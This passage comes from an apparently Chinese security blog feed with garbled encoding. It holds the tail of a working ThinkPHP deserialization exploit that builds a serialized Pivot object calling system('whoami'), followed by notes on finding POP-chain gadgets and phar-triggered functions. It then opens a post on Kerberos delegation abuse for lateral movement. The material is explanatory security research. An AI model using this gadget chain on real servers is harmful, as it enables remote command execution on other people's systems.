&#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setTable</span><span class="params">($table)</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;table = $table;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">        <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">            <span class="title">protected</span> $<span class="title">strict</span> = <span class="title">true</span>;</span><br><span class="line">            <span class="keyword">private</span> $data = [<span class="string">'key'</span> =&gt; <span class="string">'whoami'</span>];</span><br><span class="line">            <span class="keyword">private</span> $withAttr = [<span class="string">'key'</span> =&gt; <span class="string">'system'</span>];</span><br><span class="line">            <span class="keyword">protected</span> $field = [];</span><br><span class="line">            <span class="keyword">protected</span> $schema = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">        </span><br><span class="line">                <span class="comment">// åªè¯»å­—æ®µä¸å…è®¸æ›´æ–°</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;readonly <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$field])) &#123;</span><br><span class="line">                        <span class="keyword">unset</span>($data[$field]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">                $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">                <span class="comment">//$method    = 'get' . App::parseName($name, 1) . 'Attr';</span></span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br><span class="line">                    var_dump($closure, $value);</span><br><span class="line">                    $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (method_exists(<span class="keyword">$this</span>, $method)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;$method($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[$fieldName])) &#123;</span><br><span class="line">                    <span class="comment">// ç±»å‹è½¬æ¢</span></span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;readTransform($value, <span class="keyword">$this</span>-&gt;type[$fieldName]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [<span class="keyword">$this</span>-&gt;createTime, <span class="keyword">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;getTimestampValue($value);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($relation) &#123;</span><br><span class="line">                    $value = <span class="keyword">$this</span>-&gt;getRelationAttribute($name);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> $value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    $relation = <span class="keyword">false</span>;</span><br><span class="line">                    $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">                    $relation = <span class="keyword">true</span>;</span><br><span class="line">                    $value    = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> ModelEvent&#123;</span><br><span class="line">            <span class="keyword">protected</span> $withEvent = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> TimeStamp&#123;</span><br><span class="line">            <span class="keyword">protected</span> $autoWriteTimestamp = <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> RelationShip</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">private</span> $relation = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> Conversion&#123;</span><br><span class="line">            <span class="keyword">protected</span> $visable = [<span class="string">'key'</span> =&gt; <span class="string">'value'</span>];</span><br><span class="line">                  </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                $item       = [];</span><br><span class="line">                $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos($val, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>($relation, $name)      = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;visible[$relation][] = $name;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;visible[$val] = <span class="keyword">true</span>;</span><br><span class="line">                            $hasVisible          = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;hidden <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos($val, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>($relation, $name)     = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;hidden[$relation][] = $name;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;hidden[$val] = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">                $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">                        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">                            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                        $item[$key] = $val-&gt;toArray();</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">                        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">                        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $item;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title">model</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">        $model-&gt;setTable($model);</span><br><span class="line">        <span class="keyword">echo</span> urlencode(serialize($model));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸ªäººæ–¹æ³•è®º"><a href="#ä¸ªäººæ–¹æ³•è®º" class="headerlink" title="ä¸ªäººæ–¹æ³•è®º"></a>ä¸ªäººæ–¹æ³•è®º</h2><h3 id="ååºåˆ—åŒ–èµ·ç‚¹"><a href="#ååºåˆ—åŒ–èµ·ç‚¹" class="headerlink" title="ååºåˆ—åŒ–èµ·ç‚¹"></a>ååºåˆ—åŒ–èµ·ç‚¹</h3><p>èµ·ç‚¹åªæœ‰ä¸¤ä¸ª</p>
<ul>
<li>__walkup</li>
<li>__destrusct</li>
</ul>
<h3 id="ååºåˆ—åŒ–çš„ä¸­ç»§ç‚¹"><a href="#ååºåˆ—åŒ–çš„ä¸­ç»§ç‚¹" class="headerlink" title="ååºåˆ—åŒ–çš„ä¸­ç»§ç‚¹"></a>ååºåˆ—åŒ–çš„ä¸­ç»§ç‚¹</h3><ul>
<li>è¦æ˜¯æŸæ®µä»£ç ç­‰ä»·äºå½¢å¦‚<code>$this-&gt;obj1-&gt;method()</code>ï¼Œä¸­ç»§ç‚¹å¯ä»¥æ˜¯obj2çš„åŒåmethodæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æ˜¯obj3<code>__call</code>æ–¹æ³•</li>
<li>å¤„ç†å­—ç¬¦ä¸²çš„å‡½æ•°(å¯æ§$obj)ï¼Œä¸­ç»§ç‚¹å¯ä»¥æ˜¯$objçš„<code>__toString</code></li>
<li>æŸæ®µä»£ç å½¢å¦‚<code>$this-&gt;obj[$key]</code>ï¼Œä¸­ç»§ç‚¹å¯ä»¥<code>__get</code>æˆ–è€…å®ç°äº†ArrayAccessçš„æ¥å£ã€‚</li>
<li>æŸæ®µä»£ç é‡Œé¢æœ‰newäº†æ–°å¯¹è±¡ï¼Œé‚£ä¹ˆä¸­ç»§ç‚¹å¯ä»¥æ˜¯é‚£ä¸ªå¯¹è±¡çš„<code>__contrust</code>æ–¹æ³•</li>
</ul>
<p>æ€»ç»“ä¸€ä¸‹è§¦å‘<code>__toString</code>çš„</p>
<ol>
<li>phpå†…ç½®å‡½æ•°ä¼šæŠŠä¼ å…¥å˜é‡å½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™ï¼Œä¾‹å¦‚file_exists()ï¼Œsprintf</li>
<li>ä¸å…¶å®ƒå­—ç¬¦ä¸²å‘ç”Ÿè¿ç®—çš„æ—¶å€™ä¾‹å¦‚<code>.</code>ã€<code>==</code></li>
<li>phpåŸç”Ÿä»£ç é‡Œé¢çš„å¼‚å¸¸å¤„ç†ç±»å­˜åœ¨tostringè°ƒç”¨ç‚¹ï¼Œå®é™…ä½¿ç”¨æ—¶å¾ˆå¥½ç”¨</li>
</ol>
<h3 id="ååºåˆ—åŒ–çš„ç»ˆç‚¹"><a href="#ååºåˆ—åŒ–çš„ç»ˆç‚¹" class="headerlink" title="ååºåˆ—åŒ–çš„ç»ˆç‚¹"></a>ååºåˆ—åŒ–çš„ç»ˆç‚¹</h3><ul>
<li>ä¸€èˆ¬PHPä¸­çš„<strong>callæ–¹æ³•éƒ½æ˜¯ç”¨æ¥è¿›è¡Œå®¹é”™æˆ–è€…æ˜¯åŠ¨æ€è°ƒç”¨,æ‰€ä»¥ä¸€èˆ¬ä¼šåœ¨</strong>callæ–¹æ³•ä¸­ä½¿ç”¨<code>__call_user_func(\$method, $args)</code>ï¼Œ<code>__call_user_func_array([\$obj,\$method], $args)</code>ï¼Œä¾‹å¦‚tp5.1</li>
<li>åŠ¨æ€è°ƒç”¨çš„æ–¹æ³•ï¼Œ$å¯æ§æ–¹æ³•($å¯æ§å‚æ•°)ï¼Œä¾‹å¦‚tp5.2</li>
</ul>
<h3 id="ä¹¦å†™expæ—¶å€™æ³¨æ„äº‹é¡¹"><a href="#ä¹¦å†™expæ—¶å€™æ³¨æ„äº‹é¡¹" class="headerlink" title="ä¹¦å†™expæ—¶å€™æ³¨æ„äº‹é¡¹"></a>ä¹¦å†™expæ—¶å€™æ³¨æ„äº‹é¡¹</h3><ul>
<li>å°½é‡ä¸è¿›è¡Œçœç•¥æ­¥éª¤æ€§è´¨çš„ä¼˜åŒ–ï¼Œé˜²æ­¢å‡ºç°expå¯ä»¥ä½†å®é™…ç¯å¢ƒä¸æˆåŠŸäººä¸ºç„å­¦çš„æƒ…å†µã€‚</li>
<li>å¯¹å•è¡Œæ‰§è¡Œçš„ä¸è·å–è¿”å›å€¼çš„å‡½æ•°è¿›è¡Œçœç•¥ï¼ˆåªè¦å‡½æ•°å†…éƒ¨æ²¡æœ‰ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰ã€‚<br><img src="./1571231720221.png" alt="Alt text"></li>
<li>è§¦å‘æµç¨‹ä¹‹åçš„ä»£ç éƒ½å¯ä»¥çœç•¥æ‰ã€‚</li>
</ul>
<p>ä¸Šé¢è®²çš„ä¸ªäººå¿ƒå¾—æ˜¯è„±ç¦»æ¡†æ¶å†™expçš„æ€è·¯ï¼Œmaybeç›´æ¥åœ¨æ¡†æ¶ä¸‹çš„æŸä¸ªè·¯ç”±å†™expæ•ˆç‡æ›´é«˜ã€‚</p>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><h3 id="å—pharå½±å“çš„å‡½æ•°"><a href="#å—pharå½±å“çš„å‡½æ•°" class="headerlink" title="å—pharå½±å“çš„å‡½æ•°"></a>å—pharå½±å“çš„å‡½æ•°</h3><ul>
<li>fileatime / filectime / filemtime</li>
<li>stat / fileinode / fileowner / filegroup / fileperms</li>
<li>file / file_get_contents / readfile / fopen</li>
<li>file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable /</li>
<li>is_writable</li>
<li>parse_ini_file</li>
<li>unlink</li>
<li>copy</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">æŒ–æ˜æš—è—ThinkPHPä¸­çš„ååºåˆ—åˆ©ç”¨é“¾</a><br><a href="https://xz.aliyun.com/t/6467">ThinkPHP5.1.Xååºåˆ—åŒ–åˆ©ç”¨é“¾</a><br><a href="https://xz.aliyun.com/t/6476">ThinkPHP5.2.xååºåˆ—åŒ–åˆ©ç”¨é“¾</a><br><a href="https://xz.aliyun.com/t/6479">ThinkPHP6.Xååºåˆ—åŒ–åˆ©ç”¨é“¾</a><br><a href="https://www.smi1e.top/n1ctf2019-sql_manage%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/">N1CTF2019 sql_manageå‡ºé¢˜ç¬”è®°</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´</title>
    <url>/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/</url>
    <content><![CDATA[<!-- å¦‚é¢˜ -->
<!-- more -->

<h2 id="ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹"><a href="#ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹" class="headerlink" title="ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹"></a>ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹</h2><p>å‡è®¾clientæƒ³è®¿é—®server</p>
<ol>
<li>client å‘KDC-AS å‘èµ·é¢„è®¤è¯å³NTLMhashåŠ å¯†çš„æ—¶é—´æˆ³</li>
<li>KDC-AS éªŒè¯èº«ä»½åï¼Œå‘é€client NTLMhashåŠ å¯†çš„çŸ­ä¼šè¯å¯†é’¥seesionkey-aå’Œkrbtgtè´¦æˆ·å¯†ç åŠ å¯†çš„TGT(TGTä¸­ä¹ŸåŒ…å«äº†sessionkey-a)</li>
<li>client ç”¨è‡ªå·±çš„NTLMhashè§£å¯†æ‹¿åˆ°sessionkey-aï¼Œç”¨sessionkey-aåŠ å¯†æ—¶é—´æˆ³å¹¶å‘é€åŠ å¯†çš„TGTç»™KDC-TGS</li>
<li>KDC-TGSç”¨krbtgtè´¦æˆ·å¯†ç è§£å¯†è·å–åˆ°sessionkey-aï¼Œå¹¶è§£å¯†clientå‘é€çš„æ—¶é—´æˆ³ä»¥æ­¤éªŒæ˜clientèº«ä»½ã€‚ä¹‹åè¿”å›sessionkey-aåŠ å¯†çš„sessionkey-bå’Œserverçš„å¯†ç åŠ å¯†TGSï¼ˆæœ‰çš„æ–‡ç« ä¹Ÿç§°STï¼‰</li>
<li>clientç”¨sessionkey-a è§£å¯†æ‹¿åˆ°sessionkey-bï¼Œå¹¶ç”¨sessionkey-båŠ å¯†æ—¶é—´æˆ³ä¸€å¹¶å’ŒTGSå‘é€ç»™server</li>
<li>serverç”¨è‡ªå·±çš„å¯†ç è§£å¯†TGSæ‹¿åˆ°sessionkey-bè§£å¯†æ—¶é—´æˆ³ä»¥æ­¤éªŒæ˜clientèº«ä»½ã€‚è¿”å›sessionkey-båŠ å¯†çš„æ—¶é—´æˆ³ç»™clientï¼Œä»¥æ­¤å‘clientè¡¨æ˜è‡ªå·±çš„èº«ä»½ï¼ˆè¿™é‡Œä½“ç°å‡ºKerberosçš„åŒå‘éªŒè¯ï¼‰ã€‚</li>
</ol>
<h2 id="å§”æ´¾çš„åœºæ™¯"><a href="#å§”æ´¾çš„åœºæ™¯" class="headerlink" title="å§”æ´¾çš„åœºæ™¯"></a>å§”æ´¾çš„åœºæ™¯</h2><p>n1ntyå¸ˆå‚…çš„åŸè¯ï¼šç”¨æˆ· A åˆ©ç”¨ Windows èº«ä»½éªŒè¯è®¿é—®äº†ä¸€ä¸ªç½‘ç«™ï¼Œè¯·æ±‚ç½‘ç«™å†…çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªç½‘ç«™æœåŠ¡å™¨æœ¬èº«å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒéœ€è¦åˆ©ç”¨ç”¨æˆ· A çš„èº«ä»½å»è®¿é—®å¦ä¸€å°æœåŠ¡å™¨ï¼Œä»å¦ä¸€å°æœåŠ¡å™¨ä¸Šè·å–è¿™ä¸ªæ–‡ä»¶åå†è¿”å›ç»™ç”¨æˆ·ã€‚ä¸ºä»€ä¹ˆç½‘ç«™ä¼šåˆ©ç”¨ç”¨æˆ· A çš„èº«ä»½å»è·å–æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨ç½‘ç«™è‡ªèº«çš„æƒé™å»è·å–å‘¢ï¼Ÿå› ä¸ºè¦å……åˆ†åˆ©ç”¨ Windows ç³»ç»Ÿè‡ªèº«æä¾›çš„æƒé™æ§åˆ¶å•Šï¼Œä¹Ÿè®¸æœ‰çš„ç”¨æˆ·æœ‰æƒé™è®¿é—®é‚£ä¸ªæ–‡ä»¶è€Œæœ‰çš„ç”¨æˆ·æ²¡æœ‰æƒé™å•Šã€‚</p>
<h2 id="kerberoså§”æ´¾åˆ†ç±»"><a href="#kerberoså§”æ´¾åˆ†ç±»" class="headerlink" title="kerberoså§”æ´¾åˆ†ç±»"></a>kerberoså§”æ´¾åˆ†ç±»</h2><ul>
<li>Forwardable TGTï¼šUnconstrained delegation</li>
<li>Proxy ticketï¼šuser åœ¨è®¿é—® service1 çš„æ—¶å€™ï¼Œæå‰æŠŠè®¿é—®  service2 çš„ç¥¨ä¹Ÿç”³è¯·å¥½ï¼Œå¹¶æŠŠè¿™å¼ ç¥¨ä¼ é€’ç»™ service1ï¼Œç„¶å  service1 å°±å¯ä»¥åˆ©ç”¨ user çš„èº«ä»½æ¥è®¿é—®  service2</li>
<li>Constrained delegationï¼šä¼ ç»Ÿçš„çº¦æŸå§”æ´¾</li>
<li>Resource based delegationï¼šåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</li>
</ul>
<h2 id="éçº¦æŸå§”æ´¾ï¼ˆUnconstrained-delegationï¼‰"><a href="#éçº¦æŸå§”æ´¾ï¼ˆUnconstrained-delegationï¼‰" class="headerlink" title="éçº¦æŸå§”æ´¾ï¼ˆUnconstrained delegationï¼‰"></a>éçº¦æŸå§”æ´¾ï¼ˆUnconstrained delegationï¼‰</h2><p>å‡å¦‚server1ä¸»æœºè´¦æˆ·é…ç½®äº†éçº¦æŸå§”æ´¾ï¼Œé‚£ä¹ˆåŸŸè´¦æˆ·Aåœ¨å¯¹server1ä¸»æœºè´¦æˆ·æ——ä¸‹æœåŠ¡service1ï¼ˆä¾‹å¦‚cifsæœåŠ¡ï¼‰äº§ç”Ÿkerberosè®¤è¯çš„æ—¶å€™ï¼ˆä¾‹å¦‚<code>dir \\server1\c$</code>ï¼‰åŸŸè´¦æˆ·ä¼šå‘é€åŒ…å«tgtçš„tgsç»™service1ï¼Œç„¶åservice1å°±å¯ä»¥ä»£è¡¨åŸŸè´¦æˆ·Aè®¤è¯åŸŸå†…ä»»ä½•æœåŠ¡å™¨ã€‚ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1569681143411.png" alt="Alt text"></p>
<p>å…¶æ”»å‡»é¢æ˜¯å¦‚æœé»‘å®¢æ§åˆ¶äº†server1å¹¶åœ¨ä¸Šé¢æŠ“å–äº†tgtå°±å¯ä»¥å€Ÿæ­¤æ¨ªå‘ç§»åŠ¨ã€‚</p>
